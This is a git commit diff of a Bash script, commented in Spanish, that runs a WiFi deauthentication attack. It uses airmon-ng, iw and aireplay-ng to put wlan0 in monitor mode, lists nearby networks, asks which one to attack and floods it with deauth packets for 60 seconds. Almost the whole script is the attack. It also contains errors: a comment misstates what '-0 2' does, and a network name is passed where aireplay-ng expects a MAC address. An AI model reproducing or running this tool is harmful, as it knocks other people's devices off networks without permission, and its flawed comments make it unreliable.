51b8f5e66e07b533c50b18b4494d717a1a59150c
cristianmusica <75284701+cristianmusica@users.noreply.github.com>
2023-12-16 14:52:09 -0300

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,57 +1,67 @@
 #!/bin/bash
 
-# Constants
+# Colores
 RED="\033[1;31m"
 GREEN="\033[1;32m"  
+YELLOW="\033[1;33m"
 WHITE="\033[1;37m"
 
-# Get available WiFi networks
-get_wifi_networks(){
+# Interfaz (se puede cambiar según la que se use)  
+IFACE="wlan0"
 
-  echo -e "${WHITE}Buscando redes WiFi disponibles...${GREEN}\n"
+# Pone la interfaz en modo monitor
+enable_monitor() {
 
-  networks=($(sudo iwlist wlan0 scan | grep ESSID | awk '{print $2}'))
+  airmon-ng check kill
+  ip link set $IFACE down
+  iw dev $IFACE set type monitor
+  ip link set $IFACE up
 
-  echo -e "${WHITE}Redes encontradas:\n"
+}
+
+# Regresa la interfaz a modo normal  
+disable_monitor() {
+
+  ip link set $IFACE down
+  iw dev $IFACE set type managed
+  ip link set $IFACE up
+  service network-manager restart
+
+}
+
+# Realiza el ataque deauth
+attack() {
+
+  echo -e "\n${RED}[!] ${WHITE}Iniciando ataque Deauth...${WHITE}\n"
+
+  # -0 2 significa paquetes de deauth indefinidamente
+  timeout 60s aireplay-ng -0 2 -a $1 $IFACE
+
+  echo -e "\n${GREEN}[+] ${WHITE}Ataque Deauth finalizado!${WHITE}\n"
+
+}
+
+# Obtiene un SSID de red a atacar
+get_target() {
+
+  networks=($(sudo iwlist $IFACE scan | grep ESSID | awk '{print $2}'))  
+
+  echo -e "${WHITE}Redes disponibles:\n"
 
   for ((i=0; i<${#networks[@]}; i++)); do
     echo -e "${RED}$i) ${networks[$i]}"
   done
 
+  read -p "Ingresa el índice de la red a atacar: " target
+
 }
 
-# Deauth attack function
-deauth_attack(){
-  
-  read -p "Ingresa el número de red a atacar: " target  
-  ssid=${networks[target]}
+# Flujo principal
+enable_monitor
 
-  echo -e "\n${RED}Atacando red ${WHITE}$ssid ${RED}- Comenzando ataque Deauth...${WHITE}\n"
+get_target
+SSID=${networks[$target]}
 
-  timeout 60s aireplay-ng -0 0 -a $ssid wlan0
+attack $SSID  
 
-  echo -e "\n${RED}Ataque Deauth finalizado! ${WHITE}"
-  
-}
-
-# Main menu
-while :; do
-
-    clear
-    get_wifi_networks
-    echo -e "\n1) Ataque Deauth a SSID"
-    echo -e "2) Salir"
-    read -p "Opción: " option
-
-    case $option in
-     1)
-       deauth_attack
-       ;;
-     2) 
-       exit 0 
-       ;;
-     *)
-       echo -e "${RED}Opción inválida${WHITE}\n"
-    esac
-
-done
+disable_monitor
